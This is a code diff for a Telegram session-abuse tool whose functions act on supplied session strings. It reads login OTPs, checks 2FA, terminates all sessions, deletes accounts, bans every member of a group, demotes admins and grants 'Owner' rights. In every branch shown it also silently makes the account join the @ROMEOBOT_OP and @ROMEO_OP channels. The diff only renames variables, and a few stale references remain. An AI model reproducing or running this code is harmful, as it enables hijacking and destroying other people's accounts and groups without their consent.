@@ -23,7 +23,7 @@ async def users_gc(session):
     try:
         if session.endswith("="):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()                          
+            await rj.connect()                          
             try:
                 await rj(join("@ROMEOBOT_OP"))
                 await rj(join("@ROMEO_OP"))
@@ -35,7 +35,7 @@ async def users_gc(session):
             await steve.disconnect()
                  
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -55,7 +55,7 @@ async def user_info(session):
     try:
         if session.endswith("="):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            await rj.connect()
             try:
                 await rj(join("@ROMEOBOT_OP"))
                 await rj(join("@ROMEO_OP"))
@@ -66,7 +66,7 @@ async def user_info(session):
             await rj.disconnect()
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -103,7 +103,7 @@ async def banall(session,id):
     try:
         if session.endswith("="):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            await rj.connect()
             try:
                 await rj(join("@ROMEOBOT_OP"))
                 await rj(join("@ROMEO_OP"))
@@ -122,7 +122,7 @@ async def banall(session,id):
                     await asyncio.sleep(0.1)
             await rj.disconnect()
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -163,7 +163,7 @@ async def get_otp(session):
             await rj.disconnect() 
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -187,7 +187,7 @@ async def join_ch(session,id):
     try:
         if session.endswith("="):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            await rj.connect()
             try:
                 await rj(join("@ROMEOBOT_OP"))
                 await rj(join("@ROMEO_OP"))              
@@ -197,7 +197,7 @@ async def join_ch(session,id):
             await rj.disconnect() 
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -227,7 +227,7 @@ async def leave_ch(session,id):
             await rj.disconnect() 
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -260,7 +260,7 @@ async def del_ch(session,id):
             await rj.disconnect() 
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -299,7 +299,7 @@ async def check_2fa(session):
             await steve.disconnect() 
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -333,7 +333,7 @@ async def terminate_all(session):
             await rj.disconnect() 
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -363,7 +363,7 @@ async def del_acc(session):
             await rj.disconnect() 
                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -400,7 +400,7 @@ async def piromote(session,gc_id,user_id):
     try:
         if session.endswith("="):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
-            await steve.connect()
+            await rj.connect()
             try:
                 await rj(join("@ROMEOBOT_OP"))
                 await rj(join("@ROMEO_OP"))                
@@ -412,7 +412,7 @@ async def piromote(session,gc_id,user_id):
                 await rj.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
             await rj.disconnect()                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
@@ -462,7 +462,7 @@ async def demote_all(session,gc_id):
           
             await rj.disconnect()                              
         else:    
-            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
                     await r.join_chat("@ROMEOBOT_OP")
                     await r.join_chat("@ROMEO_OP")
